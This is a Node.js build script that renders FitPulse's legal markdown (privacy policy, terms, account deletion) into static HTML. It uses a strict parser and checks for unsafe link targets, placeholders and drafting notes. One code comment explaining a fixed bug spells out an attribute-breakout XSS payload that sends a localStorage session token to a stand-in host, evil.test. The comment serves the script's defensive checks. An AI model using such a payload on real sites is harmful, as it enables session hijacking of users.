// Publish the legal markdown in legal/ as static HTML in public/.
//
// Why static files and not app screens: a policy has to stay readable when the
// app fails to mount (the ErrorBoundary case), and it needs a real URL that a
// store listing, an email, or a regulator can link to. Vite copies public/
// verbatim into dist/, so /privacy.html is the same path in dev and in prod —
// which is what the PRIVACY_URL / CHD_PRIVACY_URL / TERMS_URL /
// DELETE_REQUEST_URL constants in the app file point at.
//
// The parser here is deliberately small and deliberately STRICT. It covers
// exactly the markdown these documents use and throws on anything else, with a
// file:line. That is the whole design: a legal page that silently drops a
// clause because the renderer didn't recognise it is worse than a build error.
// If you add a construct to a policy, teach the parser about it — don't loosen
// it.
//
//   node scripts/build-legal.mjs          # write public/*.html
//   node scripts/build-legal.mjs --check  # verify public/ matches legal/ (CI/test)
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const ROOT = path.join(path.dirname(fileURLToPath(import.meta.url)), '..');
const SRC = path.join(ROOT, 'legal');
const OUT = path.join(ROOT, 'public');

// ── What gets published, and what deliberately does not ──────────────────────
// Every .md in legal/ must appear in exactly one of these two lists. A new file
// in neither is a build error rather than a silent omission — that guard is the
// reason a policy can't be written and then never actually shipped, and the
// reason an internal drafting note can't be published by accident.
const PUBLISH = [
  {
    file: 'PRIVACY.md',
    slug: 'privacy',
    title: 'Privacy Policy',
    description: 'How FitPulse collects, uses and protects your personal data.',
  },
  {
    file: 'CONSUMER-HEALTH-DATA-PRIVACY.md',
    slug: 'consumer-health-data-privacy',
    title: 'Consumer Health Data Privacy',
    description: 'The separate consumer health data notice required by the Washington My Health My Data Act.',
  },
  {
    file: 'TERMS.md',
    slug: 'terms',
    title: 'Terms of Service',
    description: 'The agreement between you and FitPulse.',
  },
  {
    file: 'DELETE-ACCOUNT.md',
    slug: 'delete-account',
    title: 'Delete your account',
    description: 'How to delete your FitPulse account and everything in it.',
  },
];

// Internal drafting notes. These must never reach public/.
const INTERNAL = ['PRIVACY-POLICY-GUIDE.md', 'TERMS-RATIONALE.md'];

// ── Unresolved placeholders ──────────────────────────────────────────────────
// A published policy that still reads "{{FILL: your project's region}}" where the
// recipients belong is worse than no policy at all: it is an admission, in the
// document itself, that a disclosure the law requires was never made. The one
// thing that must never happen is a page shipping a placeholder *without* the
// draft banner, so the two are tied together here rather than left to a
// convention someone has to remember. The patterns are deliberately narrow —
// each matches a form that actually appears in legal/, and none matches a
// markdown link label (hence the `(?!\()` guards).
const PLACEHOLDER_PATTERNS = [
  /\{\{\s*FILL\b[^}]*\}?\}?/g,              // {{FILL: …}}
  /\[[A-Z][A-Z0-9 &/.,'-]{2,}\](?!\()/g,    // [LEGAL NAME] [EFFECTIVE DATE] [SPAIN] [EUR 100]
  /\[\d{1,3}\](?!\()/g,                     // [30] days, [5] working days
  /\[legal@yourdomain\]/g,
  /\[English\]/g,
];

// Drafting notes written as italic-bracket asides (*[If you are established in
// Spain: …]*) are ordinary markdown, so nothing stopped them rendering as part of
// the agreement. They belong in an internal region; finding one is a build error
// rather than a silent publication.
const ASIDE = /^\s*\*\[[^\]]+\]\*?\s*$|\*\[(?:If|Note|TODO|Consider)\b/m;

const placeholdersIn = (text) => {
  const found = [];
  for (const re of PLACEHOLDER_PATTERNS) for (const m of text.matchAll(re)) found.push(m[0]);
  return found;
};

// Internal regions are stripped before either the placeholder scan or the render,
// so a {{FILL}} quoted *inside* a drafting note (the intro box does exactly that)
// is not mistaken for an unresolved one in the published text.
const stripInternal = (md) =>
  md.replace(/<!--\s*internal:start\s*-->[\s\S]*?<!--\s*internal:end\s*-->\r?\n?/g, '');

// ── Inline markdown ──────────────────────────────────────────────────────────

// Escape for HTML text content, but leave existing character entities alone —
// TERMS.md uses &nbsp; for sub-clause indents, and turning those into &amp;nbsp;
// would print the entity instead of the space.
//
// `"` is escaped as well as the three structural characters, and that one is not
// cosmetic: every interpolation below lands in a double-quoted ATTRIBUTE as well as
// in text, and a `"` that survives closes the attribute. See SAFE_URL.
const escapeHtml = (s) =>
  s
    .replace(/&(?![a-zA-Z][a-zA-Z0-9]{1,31};|#\d{1,7};|#x[0-9a-fA-F]{1,6};)/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');

// Only these link schemes are emitted. Anything else (javascript:, data:) is a
// build error: these pages are served from our own origin, so an injected link
// target would run in it.
const SAFE_URL = /^(?:https?:\/\/|mailto:|\/|#)/i;

// …and a scheme whitelist alone did NOT deliver that. The href is interpolated into
// a double-quoted attribute, the URL capture below is `[^)\s]+` (which permits a
// quote), and escapeHtml did not escape `"` — so a target of
//
//   /privacy.html"/onmouseover="location='//evil.test/?c='+localStorage['sb-…']"/x="
//
// passed SAFE_URL (it starts with `/`), needed no whitespace, no parentheses and none
// of `< > &`, and rendered as a live event handler on our own origin — next to the
// app's session token in localStorage. HTML5 accepts `/` as an attribute separator,
// which is what carried it.
//
// escapeHtml now closes it. This is the belt to that braces: a quote in a link target
// is never legitimate, so it fails the build LOUDLY rather than being silently
// encoded, because the interesting question when one appears is "who wrote that".
//
// It matches the ENTITY forms as well as the raw characters, because escapeHtml runs
// FIRST (see `inline`): by the time the link regex sees a URL, a literal `"` is
// already `&quot;`. A check for `"` alone would therefore never fire — passing, for
// the reason that made the bug possible in the first place.
const QUOTE_IN_URL = /["'`]|&quot;|&apos;|&#0*(?:34|39|96);|&#x0*(?:22|27|60);/i;

// Placeholder for a lifted-out code span. Printable and greppable on purpose: a
// raw control character in source makes the file read as binary to git and grep.
const CODE_MARK = '@@CODE';

const inline = (text, where) => {
  const codes = [];
  let t = escapeHtml(text);

  // Code spans come out first so their contents can't be re-parsed as emphasis
  // or as a link. The sentinel is asserted absent rather than assumed: a
  // collision would silently splice a code span into unrelated prose.
  if (t.includes(CODE_MARK)) throw new Error(`${where}: text contains the reserved marker ${CODE_MARK}`);
  t = t.replace(/`([^`]+)`/g, (_, c) => `${CODE_MARK}${codes.push(c) - 1}@@`);

  t = t.replace(/\[([^\]]+)\]\(([^)\s]+)\)/g, (_, label, url) => {
    if (!SAFE_URL.test(url)) throw new Error(`${where}: refusing unsafe link target "${url}"`);
    if (QUOTE_IN_URL.test(url)) throw new Error(`${where}: refusing link target containing a quote "${url}" — it would break out of the href attribute`);
    const external = /^https?:/i.test(url);
    const attrs = external ? ' target="_blank" rel="noopener noreferrer"' : '';
    return `<a href="${url}"${attrs}>${label}</a>`;
  });

  t = t.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
  t = t.replace(/(^|[^*])\*([^*\n]+)\*/g, '$1<em>$2</em>');
  t = t.replace(/@@CODE(\d+)@@/g, (_, i) => `<code>${codes[Number(i)]}</code>`);

  // A leftover "](" means a link the regex above didn't understand. Silently
  // shipping raw markdown is exactly the failure this script exists to prevent,
  // so it is fatal.
  if (t.includes('](')) throw new Error(`${where}: unparsed link syntax`);
  if (t.includes(CODE_MARK)) throw new Error(`${where}: unrestored code span`);
  return t;
};

// ── Block markdown ───────────────────────────────────────────────────────────

const isHeading = (l) => /^#{1,6}\s+/.test(l);
const isRule = (l) => /^(?:-{3,}|\*{3,}|_{3,})\s*$/.test(l);
const isTable = (l) => l.startsWith('|');
const isQuote = (l) => l.startsWith('>');
const isBullet = (l) => /^[-*]\s+/.test(l);
const isOrdered = (l) => /^\d+\.\s+/.test(l);
const isSubClause = (l) => l.startsWith('&nbsp;');

// A line that begins a new block, i.e. one that a running paragraph must stop at.
const startsBlock = (l) =>
  !l.trim() || isHeading(l) || isRule(l) || isTable(l) || isQuote(l) || isBullet(l) || isOrdered(l) || isSubClause(l);

const splitRow = (line) =>
  line
    .replace(/^\|/, '')
    .replace(/\|\s*$/, '')
    .split('|')
    .map((c) => c.trim());

const renderTable = (lines, start, ctx) => {
  const header = splitRow(lines[start]);
  const sep = lines[start + 1];
  if (!sep || !isTable(sep) || !/^\|[\s:|-]+\|?\s*$/.test(sep)) {
    throw new Error(`${ctx}:${start + 2}: table header is not followed by a separator row`);
  }
  const align = splitRow(sep).map((c) =>
    c.startsWith(':') && c.endsWith(':') ? 'center' : c.endsWith(':') ? 'right' : 'left',
  );
  if (align.length !== header.length) {
    throw new Error(`${ctx}:${start + 2}: separator has ${align.length} cells, header has ${header.length}`);
  }

  const cell = (c, i, tag) =>
    `<${tag}${align[i] && align[i] !== 'left' ? ` style="text-align:${align[i]}"` : ''}>${inline(c, `${ctx}:${start + 1}`)}</${tag}>`;

  const body = [];
  let i = start + 2;
  for (; i < lines.length && isTable(lines[i]); i++) {
    const cells = splitRow(lines[i]);
    if (cells.length !== header.length) {
      throw new Error(`${ctx}:${i + 1}: row has ${cells.length} cells, header has ${header.length}`);
    }
    body.push(`<tr>${cells.map((c, n) => cell(c, n, 'td')).join('')}</tr>`);
  }

  const html =
    '<div class="scroll"><table>' +
    `<thead><tr>${header.map((c, n) => cell(c, n, 'th')).join('')}</tr></thead>` +
    `<tbody>${body.join('')}</tbody>` +
    '</table></div>';
  return [html, i];
};

const renderList = (lines, start, ctx) => {
  const ordered = isOrdered(lines[start]);
  const matches = ordered ? isOrdered : isBullet;
  const strip = ordered ? /^\d+\.\s+/ : /^[-*]\s+/;
  const items = [];
  let i = start;
  while (i < lines.length && matches(lines[i])) {
    // Soft-wrapped continuation lines belong to the item they follow.
    const parts = [lines[i].replace(strip, '')];
    i++;
    while (i < lines.length && lines[i].trim() && !startsBlock(lines[i])) parts.push(lines[i++].trim());
    items.push(`<li>${inline(parts.join(' '), `${ctx}:${start + 1}`)}</li>`);
  }
  const tag = ordered ? 'ol' : 'ul';
  return [`<${tag}>${items.join('')}</${tag}>`, i];
};

const toHtml = (md, ctx) => {
  // Regions marked internal never reach the published page. Used for drafting
  // notes that live alongside the clause text they describe. This MUST run before
  // the general comment strip below, or that strip would remove the start/end
  // markers and leave the note between them as published prose.
  md = stripInternal(md);

  // Every remaining HTML comment, including ones that span lines. This used to be
  // a per-line test for a comment that opened and closed on the same line, which a
  // wrapped comment never matches — so it fell through to the paragraph renderer,
  // was HTML-escaped, and printed a note addressed to the drafter inside the
  // published contract, closing "-->" and all. A comment is never content.
  md = md.replace(/<!--[\s\S]*?-->\r?\n?/g, '');

  const lines = md.split(/\r?\n/);
  const out = [];
  let i = 0;

  while (i < lines.length) {
    const line = lines[i];
    const where = `${ctx}:${i + 1}`;

    if (!line.trim()) { i++; continue; }

    // Comments are already gone. Anything that still looks like one is unclosed,
    // and would otherwise be escaped and printed as contract text — so it is fatal
    // rather than rendered.
    if (line.includes('<!--') || line.includes('-->')) {
      throw new Error(`${where}: unterminated HTML comment — a drafting note would be published as prose`);
    }

    if (isHeading(line)) {
      const [, hashes, body] = /^(#{1,6})\s+(.*)$/.exec(line);
      const level = hashes.length;
      out.push(`<h${level}>${inline(body.trim(), where)}</h${level}>`);
      i++;
      continue;
    }

    if (isRule(line)) { out.push('<hr>'); i++; continue; }

    if (isTable(line)) {
      const [html, next] = renderTable(lines, i, ctx);
      out.push(html);
      i = next;
      continue;
    }

    if (isQuote(line)) {
      const inner = [];
      while (i < lines.length && isQuote(lines[i])) {
        inner.push(lines[i].replace(/^>\s?/, ''));
        i++;
      }
      out.push(`<blockquote>${toHtml(inner.join('\n'), ctx)}</blockquote>`);
      continue;
    }

    if (isBullet(line) || isOrdered(line)) {
      const [html, next] = renderList(lines, i, ctx);
      out.push(html);
      i = next;
      continue;
    }

    // A sub-clause (&nbsp;-indented "(a) …") is its own block. Joining it into
    // the paragraph above would run the lettered clauses of a section together
    // into one wall of text and lose the structure the numbering carries.
    if (isSubClause(line)) {
      const parts = [line];
      i++;
      while (i < lines.length && lines[i].trim() && !startsBlock(lines[i])) parts.push(lines[i++].trim());
      out.push(`<p class="sub">${inline(parts.join(' '), where)}</p>`);
      continue;
    }

    // Paragraph: soft-wrapped source lines rejoin into one.
    const parts = [line.trim()];
    i++;
    while (i < lines.length && lines[i].trim() && !startsBlock(lines[i])) parts.push(lines[i++].trim());
    out.push(`<p>${inline(parts.join(' '), where)}</p>`);
  }

  return out.join('\n');
};

// ── Page shell ───────────────────────────────────────────────────────────────
// Self-contained: no build step, no Tailwind, no font files, no network. The
// token values are copied from src/index.css — if you change a token there,
// change it here too, the same way CHART mirrors them for recharts.
const page = ({ title, description, body, draft }) => `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>${title} — FitPulse</title>
<meta name="description" content="${description.replace(/"/g, '&quot;')}">
<style>
  :root {
    --ground: 238 241 243; --surface: 255 255 255; --line: 215 222 227;
    --ink: 13 18 21; --muted: 90 104 116; --faint: 147 161 172;
    --accent: 27 95 191; --warn: 169 116 31;
  }
  @media (prefers-color-scheme: dark) {
    :root {
      --ground: 13 18 21; --surface: 21 28 33; --line: 38 49 58;
      --ink: 230 237 243; --muted: 139 154 167; --faint: 90 104 116;
      --accent: 46 123 214; --warn: 224 166 60;
    }
  }
  * { box-sizing: border-box; }
  body {
    margin: 0; padding: 2rem 1.25rem 5rem;
    background: rgb(var(--ground)); color: rgb(var(--ink));
    font: 400 16px/1.65 Barlow, ui-sans-serif, system-ui, -apple-system, "Segoe UI", sans-serif;
    -webkit-text-size-adjust: 100%;
  }
  main { max-width: 46rem; margin: 0 auto; }
  h1, h2, h3, h4 {
    font-family: "Barlow Condensed", Barlow, ui-sans-serif, system-ui, sans-serif;
    line-height: 1.15; margin: 2.25rem 0 .75rem; font-weight: 700;
  }
  h1 { font-size: 2rem; text-transform: uppercase; letter-spacing: .02em; margin-top: 0; }
  h2 { font-size: 1.4rem; border-bottom: 1px solid rgb(var(--line)); padding-bottom: .4rem; }
  h3 { font-size: 1.15rem; }
  h4 { font-size: 1rem; color: rgb(var(--muted)); text-transform: uppercase; letter-spacing: .08em; }
  p { margin: 0 0 .9rem; }
  p.sub { margin: 0 0 .35rem; padding-left: 1.5rem; text-indent: -1.5rem; }
  a { color: rgb(var(--accent)); text-underline-offset: 2px; }
  ul, ol { margin: 0 0 1rem; padding-left: 1.35rem; }
  li { margin-bottom: .35rem; }
  hr { border: 0; border-top: 1px solid rgb(var(--line)); margin: 2rem 0; }
  code {
    font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: .875em;
    background: rgb(var(--surface)); border: 1px solid rgb(var(--line));
    border-radius: 3px; padding: .1em .35em;
  }
  blockquote {
    margin: 0 0 1rem; padding: .75rem 1rem;
    background: rgb(var(--surface)); border-left: 3px solid rgb(var(--accent));
    border-radius: 0 6px 6px 0;
  }
  blockquote p:last-child { margin-bottom: 0; }
  .scroll { overflow-x: auto; margin: 0 0 1.25rem; }
  table { border-collapse: collapse; width: 100%; font-size: .925rem; }
  th, td { border: 1px solid rgb(var(--line)); padding: .5rem .65rem; text-align: left; vertical-align: top; }
  th { background: rgb(var(--surface)); font-weight: 600; }
  .draft {
    background: rgb(var(--surface)); border: 1px solid rgb(var(--warn));
    border-left-width: 3px; border-radius: 6px; padding: .75rem 1rem; margin: 0 0 2rem;
    color: rgb(var(--muted)); font-size: .925rem;
  }
  .home { display: inline-block; margin-bottom: 2rem; font-size: .875rem; color: rgb(var(--muted)); }
  footer { margin-top: 3rem; padding-top: 1rem; border-top: 1px solid rgb(var(--line));
           color: rgb(var(--faint)); font-size: .8125rem; }
</style>
</head>
<body>
<main>
<a class="home" href="/">← FitPulse</a>
${draft ? '<p class="draft"><strong>Draft.</strong> This document is not yet in force and has not been reviewed by a lawyer. It is published here so it can be read and commented on.</p>' : ''}
${body}
<footer>FitPulse · <a href="/privacy.html">Privacy</a> · <a href="/consumer-health-data-privacy.html">Consumer Health Data</a> · <a href="/terms.html">Terms</a> · <a href="/delete-account.html">Delete account</a></footer>
</main>
</body>
</html>
`;

// ── Build ────────────────────────────────────────────────────────────────────

const render = (doc) => {
  const file = path.join(SRC, doc.file);
  if (!fs.existsSync(file)) throw new Error(`legal/${doc.file} is listed for publication but does not exist`);
  const md = fs.readFileSync(file, 'utf8');
  const draft = /<!--\s*legal:draft\s*-->/.test(md);

  const publishable = stripInternal(md);

  const aside = ASIDE.exec(publishable);
  if (aside) {
    throw new Error(
      `legal/${doc.file}: drafting aside "${aside[0].trim().slice(0, 60)}…" is outside an internal region, ` +
        `so it would be published as part of the agreement. Wrap it in <!-- internal:start --> … <!-- internal:end -->.`,
    );
  }

  // The draft marker and the placeholders must agree. Both directions are wrong:
  // a placeholder without the banner publishes a hole in the disclosure with
  // nothing to warn the reader, and a banner without placeholders tells every
  // reader the document is not in force when it is.
  const holes = placeholdersIn(publishable);
  if (holes.length && !draft) {
    throw new Error(
      `legal/${doc.file}: ${holes.length} unresolved placeholder(s) but no <!-- legal:draft --> marker.\n` +
        `  ${[...new Set(holes)].slice(0, 6).join('\n  ')}\n` +
        `Resolve them, or restore the marker on line 1.`,
    );
  }
  if (!holes.length && draft) {
    throw new Error(
      `legal/${doc.file}: no placeholders remain but the <!-- legal:draft --> marker is still on line 1.\n` +
        `Remove it — the banner tells readers the document is not in force.`,
    );
  }

  return { html: page({ ...doc, body: toHtml(md, `legal/${doc.file}`), draft }), draft, holes };
};

const main = () => {
  const check = process.argv.includes('--check');
  // The launch gate. `npm run legal:release` answers one question: is every
  // document a real user is asked to ACCEPT actually in force? Signup's tick-box
  // says "I accept the Terms of Service and the Privacy Policy" — pointing that at
  // a page banner-stamped "not yet in force" either forms no contract at all
  // (losing §9's assumption of risk and §14's cap) or is ambiguous, and TERMS.md
  // §20.6 construes ambiguity in the user's favour. Run this before going live.
  const release = process.argv.includes('--release');

  // Coverage guard: nothing in legal/ may be unaccounted for.
  const present = fs.readdirSync(SRC).filter((f) => f.endsWith('.md')).sort();
  const known = new Set([...PUBLISH.map((d) => d.file), ...INTERNAL]);
  const orphans = present.filter((f) => !known.has(f));
  if (orphans.length) {
    throw new Error(
      `legal/ contains ${orphans.join(', ')}, which is neither published nor listed as internal.\n` +
        `Add it to PUBLISH or INTERNAL in scripts/build-legal.mjs.`,
    );
  }

  if (!check && !release) fs.mkdirSync(OUT, { recursive: true });

  const drafts = [];
  const stale = [];
  const openHoles = new Map();
  for (const doc of PUBLISH) {
    const { html, draft, holes } = render(doc);
    if (draft) drafts.push(doc.slug);
    if (holes.length) openHoles.set(doc.file, holes);
    if (release) continue;
    const target = path.join(OUT, `${doc.slug}.html`);
    if (check) {
      const current = fs.existsSync(target) ? fs.readFileSync(target, 'utf8') : null;
      if (current !== html) stale.push(`${doc.slug}.html`);
    } else {
      fs.writeFileSync(target, html, 'utf8');
      console.log(`  public/${doc.slug}.html  ←  legal/${doc.file}${draft ? '  (draft)' : ''}`);
    }
  }

  if (release) {
    if (!drafts.length) {
      console.log(`build-legal --release: all ${PUBLISH.length} documents are in force — no placeholders, no draft banners.`);
      return;
    }
    console.error(`NOT READY TO PUBLISH — ${drafts.length} document(s) still marked draft.\n`);

    // Grouped by the placeholder text, NOT by file. The same fact appears in more than one
    // document (the postal address is in three), and a per-file list is exactly how one of
    // them gets resolved and the others don't — leaving two published policies that
    // disagree about who the processor is or where the data lives. One line per fact, with
    // every document it has to be fixed in, so a half-resolved fact is visible.
    const byFact = new Map();
    for (const [file, holes] of openHoles) {
      for (const h of holes) {
        const key = h.replace(/\s+/g, ' ').trim();
        if (!byFact.has(key)) byFact.set(key, new Set());
        byFact.get(key).add(file);
      }
    }
    console.error(`${byFact.size} distinct fact(s) still to supply:\n`);
    for (const [fact, files] of [...byFact].sort()) {
      const where = [...files].map((f) => f.replace(/\.md$/, '')).join(', ');
      console.error(`  ${fact.length > 76 ? `${fact.slice(0, 75)}…` : fact}`);
      console.error(`      → ${where}${files.size > 1 ? '   (resolve in ALL of them)' : ''}`);
    }
    console.error(
      `\nSignup asks users to ACCEPT these documents. While they carry the draft banner,\n` +
        `that acceptance is at best ambiguous and TERMS.md § 20.6 reads ambiguity against us.`,
    );
    process.exit(1);
  }

  if (check) {
    if (stale.length) {
      console.error(`public/ is out of date with legal/: ${stale.join(', ')}`);
      console.error('Run `npm run legal` and commit the result.');
      process.exit(1);
    }
    console.log(`build-legal --check: public/ matches legal/ (${PUBLISH.length} documents)`);
    return;
  }

  console.log(`\n${PUBLISH.length} legal pages written to public/.`);
  if (drafts.length) console.log(`Still marked draft: ${drafts.join(', ')}.`);
};

main();
